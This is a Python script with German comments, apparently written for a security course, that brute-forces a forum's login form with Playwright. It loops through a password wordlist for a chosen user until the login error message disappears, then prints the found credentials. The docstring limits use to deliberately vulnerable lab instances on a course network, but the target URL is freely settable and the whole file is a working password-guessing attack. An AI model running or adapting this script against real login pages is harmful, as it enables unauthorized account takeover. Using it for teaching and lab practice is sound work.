"""Brute-Force-Demo gegen ein Cowboy-Forum mit Playwright.

Kurs-Setup: Jede/r betreibt die eigene (absichtlich verwundbare) Instanz im
gemeinsamen Kurs-Netz; ihr greift euch gegenseitig an. Das Ziel ist daher frei
wählbar — Standard ist die eigene Instanz.

    pip install playwright
    playwright install chromium

    # eigene Instanz:
    python attack_playwright.py --user admin --wordlist rockyou_small.txt
    # Mitspieler im Kurs-Netz:
    python attack_playwright.py --base http://192.168.1.42:5000 --user admin --wordlist rockyou_small.txt

Nur im Kurs-Netz und nur gegen Lab-Instanzen von Leuten, die mitspielen.
"""
import argparse
import os
import sys

from playwright.sync_api import sync_playwright


def try_login(page, base: str, user: str, pw: str) -> bool:
    page.goto(f"{base}/login")
    page.fill('input[name="username"]', user)
    page.fill('input[name="password"]', pw)
    page.click('button[type="submit"], input[type="submit"]')
    page.wait_for_load_state("networkidle")
    # Erfolg: kein "Falscher Benutzername oder Passwort" mehr auf der Seite.
    return "Falscher Benutzername oder Passwort" not in page.content()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=os.environ.get("TARGET_URL", "http://127.0.0.1:5000"),
                    help="Ziel-URL, z. B. http://192.168.1.42:5000")
    ap.add_argument("--user", required=True)
    ap.add_argument("--wordlist", required=True)
    args = ap.parse_args()
    base = args.base.rstrip("/")
    print(f"[*] Ziel: {base}")

    with open(args.wordlist, encoding="utf-8", errors="ignore") as fh:
        words = [w.strip() for w in fh if w.strip()]

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        for i, pw in enumerate(words, 1):
            if try_login(page, base, args.user, pw):
                print(f"\n[+] TREFFER nach {i} Versuchen: {args.user}:{pw}")
                browser.close()
                return 0
            print(f"[{i}/{len(words)}] {pw!r} falsch", end="\r")
        browser.close()
    print("\n[-] Kein Treffer in der Liste.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
